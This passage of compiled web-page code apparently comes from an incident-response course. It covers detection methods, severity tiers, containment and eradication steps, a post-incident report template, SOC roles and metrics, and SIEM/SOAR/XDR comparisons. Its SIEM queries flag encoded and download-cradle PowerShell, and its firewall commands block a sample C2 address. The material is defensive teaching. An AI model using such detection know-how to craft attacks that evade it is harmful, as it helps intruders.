    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Identify that an incident has occurred and gather sufficient information to understand its scope and severity."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection Methods:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Method"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Typical Alerts"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SIEM Correlation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Rule-based alerting on aggregated logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Multiple failed logins + successful login from new IP"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "EDR Detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Endpoint behavioral analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process injection detected, ransomware behavior"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Network IDS/IPS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Signature and anomaly detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C2 beacon detected, SQL injection attempt"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "User Report"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "End-user reports suspicious activity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"My files are being renamed!\""
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Threat Intelligence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IOC matching"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Known bad hash executed on endpoint"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Anomaly Detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ML-based baseline deviation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unusual data transfer volume"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Honeypot/Honeytoken"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deception technology"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Honeytoken file accessed"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "External Notification"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Law enforcement, partner, media"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"Your data is on the dark web\""
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Severity Classification:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Severity"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Response Time"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Examples"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Critical (P1)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Significant data loss, systems down, PII exposed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "<15 min"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ransomware, data breach, APT"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "High (P2)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Contained but active threat, limited data exposure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "<1 hour"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Targeted phish successful, malware on server"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Medium (P3)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Potential compromise, no confirmed data loss"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "<4 hours"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing campaign detected, scanning activity"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Low (P4)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Minor violation, no evidence of compromise"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "<24 hours"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Policy violation, attempted access"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Splunk: Search for anomalous process creation\nindex=windows EventCode=4688\n| search New_Process_Name=\"*powershell*\" OR \"*wscript*\" OR \"*cmd*\"\n| stats count by User, New_Process_Name, ComputerName\n| where count > 5\n\n# Elastic/SIEM: Suspicious PowerShell detection\nevent.code: 4688 AND process.name: powershell.exe\nAND winlog.event_data.CommandLine: *-enc* OR *-ExecutionPolicy* OR *DownloadString*\n\n# Windows Event Log: Event ID 4688 (process creation)\nwevtutil qe Security /q:\"Event[System[EventID=4688]]\" /f:text /c:1000\n\n# Linux: Check for suspicious cron jobs\ncrontab -l\nls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "phase-3-containment-eradication--recovery",
      children: "Phase 3: Containment, Eradication & Recovery"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " In a ship with a hull breach, containment is closing the watertight doors immediately (stop the flooding). Eradication is pumping out the water and patching the hole. Recovery is returning to normal sailing speed."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Containment Strategies:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Strategy"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "When to Use"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Risk"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Network Isolation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disconnect from network"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Active malware spreading"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "May alert attacker"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "System Shutdown"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Power off system"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Irreversible damage imminent"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Loses memory evidence"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Account Disable"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disable compromised accounts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Credential theft verified"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "May disrupt legitimate users"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IP Blocking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Block C2 IPs at firewall"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Active C2 communication"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "May block legitimate services"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DNS Sinkhole"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Redirect malicious domains"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DNS-based C2 detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "May break DNS for some services"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Patch Deployment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Apply security patches"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerability-based attack"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "May cause system instability"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Credential Reset"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Force password reset"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Credential compromise"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User disruption"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Containment Commands:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Block IP at firewall (iptables)\nsudo iptables -A OUTPUT -d 185.234.72.18 -j DROP\nsudo iptables -A INPUT -s 185.234.72.18 -j DROP\n\n# Windows Firewall block\nnetsh advfirewall firewall add rule name=\"Block C2\" dir=out remoteip=185.234.72.18 action=block\n\n# Kill malicious process (Windows)\ntaskkill /PID 3456 /F\n\n# Kill malicious process (Linux)\nsudo kill -9 3456\n\n# Disable compromised account\n# Windows AD:\nnet user jdoe /ACTIVE:NO\n\n# Linux:\nsudo passwd -l jdoe\n\n# Azure:\nDisable-AzADUser -UserPrincipalName jdoe@company.com\n\n# Create network ACL in AWS\naws ec2 create-network-acl-entry \\\n    --network-acl-id acl-0123456789abcdef0 \\\n    --ingress \\\n    --rule-number 100 \\\n    --protocol tcp \\\n    --port-range From=443,To=443 \\\n    --cidr-block 185.234.72.18/32 \\\n    --rule-action deny\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Eradication Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Remove malware from affected systems (antivirus scan, reimage)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Patch exploited vulnerabilities"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Reset compromised credentials (all accounts, not just the known compromised)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Revoke and rotate API keys and certificates"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Remove persistence mechanisms (registry Run keys, scheduled tasks, cron jobs)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Rebuild systems from known-clean images when possible"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Verify eradication with full system scan"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Recovery Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Restore systems from clean backups"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Validate restored system functionality"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Monitor systems for signs of re-infection"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Gradually return to normal operations"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Communicate recovery status to stakeholders"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Document lessons learned in real time"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "phase-4-post-incident-activity",
      children: "Phase 4: Post-Incident Activity"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Learn from the incident to prevent recurrence and improve future response."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Lessons Learned Meeting Agenda:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What happened (timeline review)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What went well (successes)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What went wrong (failures)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Root cause analysis"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Improvement items with owners and deadlines"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Update IR plan, playbooks, and detection rules"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Legal and compliance follow-up"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Post-Incident Report Template:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-markdown",
        children: "# Post-Incident Report: IR-2024-001\n\n## Executive Summary\n[One paragraph for non-technical audience]\n\n## Incident Details\n- Date/Time Discovered:\n- Date/Time Occurred:\n- Incident Type:\n- Severity:\n- Affected Systems:\n- Data Affected:\n\n## Timeline\n| Time (UTC) | Event | Source |\n|------------|-------|--------|\n| 14:30:00 | User opened phishing email | Email logs |\n| 14:30:05 | Macro executed | Event ID 4688 |\n| 14:30:10 | PowerShell download cradle | Event ID 4688 + network log |\n| 14:30:15 | C2 beacon established | Zeek conn.log |\n| 14:45:00 | Lateral movement to DB server | Event ID 4624 |\n| 15:10:00 | Data exfiltration | VPC Flow Logs |\n| 15:30:00 | Alert generated by SIEM | SIEM alert log |\n| 15:35:00 | SOC analyst triage begins | IR ticket |\n| 16:00:00 | Containment initiated | Change request |\n| 18:00:00 | Eradication complete | Incident log |\n| 20:00:00 | Service restored | IT ticket |\n\n## Indicators of Compromise\n- IP: 185.234.72.18 (C2)\n- Domain: abcdefgh123456.xyz\n- File hash (SHA-256): a8f5f167f44f4964e6c998d67f3b3b9e...\n- Registry key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateService\n- YARA rule: [see attached]\n\n## Root Cause\n[Detailed analysis of how the incident occurred]\n\n## Lessons Learned\n| What Went Well | What Could Improve | Action Items |\n|----------------|-------------------|--------------|\n| Rapid detection by SIEM | Longer user security awareness training | 1. Mandatory phishing training monthly |\n| Effective containment | Faster log source ingestion | 2. Optimize log pipeline |\n| Clear communication | Develop playbook for this scenario | 3. Write ransomware playbook |\n\n## Remediation Plan\n| # | Action | Owner | Due Date |\n|---|--------|-------|----------|\n| 1 | Deploy email filtering DMARC/DKIM/DMARC | IT Security | 2024-07-01 |\n| 2 | Implement AppLocker | IT Security | 2024-07-15 |\n| 3 | Phase out PowerShell v2 | IT Operations | 2024-08-01 |\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "92-soc-operations",
      children: "9.2 SOC Operations"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "The SOC (Security Operations Center)"
      }), " is the central function that monitors, detects, analyzes, and responds to security incidents."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "soc-tier-model",
      children: "SOC Tier Model"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Tier"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Role"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Responsibilities"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Skills"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Typical Alerts"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Tier 1"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Triage Analyst"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Alert review, initial triage, categorization, escalation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Foundational security knowledge, SIEM querying"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "P3/P4 alerts, known IOCs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Tier 2"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Incident Responder"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deep investigation, containment, evidence collection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Forensic analysis, malware analysis, network analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "P2 alerts, confirmed incidents"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Tier 3"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Expert Analyst"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Advanced analysis, reverse engineering, threat hunting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Reverse engineering, exploit analysis, custom tool development"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "P1 incidents, APT, zero-days"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Tier 4"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SOC Manager"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Operations management, reporting, strategy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Management, compliance, communication"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Escalation oversight"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "soc-metrics",
      children: "SOC Metrics"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Metric"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Target"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Formula"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mean Time to Detect (MTTD)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "<1 hour for critical"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sum(Time to Detect) / Number of Incidents"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mean Time to Respond (MTTR)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "<15 min for critical"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sum(Time to Respond) / Number of Incidents"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mean Time to Contain (MTTC)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "<1 hour for active threats"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sum(Time to Contain) / Number of Incidents"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Alert Volume"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Varies"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Total alerts per day"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "False Positive Rate"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "<10%"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "False Positives / Total Alerts × 100"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Escalation Rate"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "20-30%"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Escalated / Total Triaged × 100"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Time to Resolution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "<24 hours for P3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sum(Resolved Time) / Number of Incidents"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "93-siem-vs-soar-vs-xdr",
      children: "9.3 SIEM vs SOAR vs XDR"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Capability"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "SIEM"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "SOAR"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "XDR"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Full Name"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security Information and Event Management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security Orchestration, Automation and Response"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extended Detection and Response"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Primary Function"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Log aggregation, correlation, alerting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automated response workflows, orchestration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Integrated endpoint + network + cloud detection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Data Source"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logs (any source)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SIEM alerts, ticketing, threat intel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Endpoint agents, network sensors, cloud APIs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Analysis"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Rule-based, correlation, UEBA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Playbook-driven decision trees"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ML-based behavioral, cross-vector correlation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Response"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Manual (alerts analyst)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automated (playbook execution)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automated (isolation, containment)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Coverage"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Broad → any log source"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Operational → process automation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deep → endpoint + network + cloud"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Examples"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Splunk ES, Elastic Security, QRadar, ArcSight, Sentinel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Splunk SOAR, Palo Alto XSOAR, Sumo Logic SOAR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CrowdStrike Falcon, SentinelOne, Microsoft 365 Defender, Trend Vision One"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Best For"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Centralized visibility and compliance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Repeating response tasks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Comprehensive threat detection and auto-response"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Limitation"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High noise, manual response required"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires playbook development"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vendor-specific, less flexibility"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "When to Use Which:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Scenario"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Use"
          })]
        })
